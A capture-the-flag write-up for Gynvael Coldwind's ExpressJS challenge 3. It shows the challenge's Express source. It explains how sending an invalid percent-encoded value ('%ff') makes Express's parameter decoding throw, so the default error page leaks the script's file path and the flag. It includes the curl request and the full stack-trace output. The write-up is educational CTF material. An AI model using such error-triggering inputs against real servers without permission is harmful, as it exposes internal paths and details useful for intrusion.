# Gynvael Coldwind ExpressJS challenge 3

Source: https://twitter.com/gynvael/status/1259087300824305665

_*NOTE: I did not manage to solve this one on my own. Honestly, I did not even understood what was the actual goal of the challenge, but I'm still writing it up for completness and possible future reference. Thanks to oshogbovx, this is no longer a mystery.*_

ref: https://twitter.com/oshogbovx/status/1260330247905574912

## Challenge

We are provided with this code on the web page:
```javascript
// IMPORTANT NOTE:
// The secret flag you need to find is in the path name of this JavaScript file.
// So yes, to solve the task, you just need to find out what's the path name of
// this node.js/express script on the filesystem and that's it.

const express = require('express')
const fs = require('fs')
const path = require('path')

const PORT = 5003
const FLAG = process.env.FLAG || "???"
const SOURCE = fs.readFileSync(path.basename(__filename))

const app = express()

app.get('/', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')
  res.write("Level 3\n\n")
  res.end(SOURCE)
})

app.get('/truecolors/:color', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')

  const color = ('color' in req.params) ? req.params.color : '???'

  if (color === 'red' || color === 'green' || color === 'blue') {
    res.end('Yes! A true color!')
  } else {
    res.end('Hmm? No.')
  }
})

app.listen(PORT, () => {
  console.log(`Challenge listening at port ${PORT}`)
})
```

## Analysis

The actual problem is not in the code that we are viewing. It is expected that we observe the issue in `req.params` when it is being decoded under the hood.

There is important information regarding decoding in [the documentation](https://expressjs.com/en/4x/api.html#req.params).

> NOTE: Express automatically decodes the values in req.params (using decodeURIComponent).

This means that if an invalid character is supplied, we might get the reward.

## Solution

You can get the flag by specifying an invalid character as `color`:

`http://challenges.gynvael.stream:5003/truecolors/%ff`

Proof that it works:
```
$ curl "http://challenges.gynvael.stream:5003/truecolors/%ff"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>URIError: Failed to decode param &#39;%ff&#39;<br> &nbsp; &nbsp;at decodeURIComponent (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at decode_param (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/layer.js:172:12)<br> &nbsp; &nbsp;at Layer.match (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/layer.js:148:15)<br> &nbsp; &nbsp;at matchLayer (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:574:18)<br> &nbsp; &nbsp;at next (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:220:15)<br> &nbsp; &nbsp;at expressInit (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/middleware/init.js:40:5)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at trim_prefix (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:317:13)<br> &nbsp; &nbsp;at /usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:284:7<br> &nbsp; &nbsp;at Function.process_params (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:335:12)</pre>
</body>
</html>
```

... and this is how the important note makes sense.
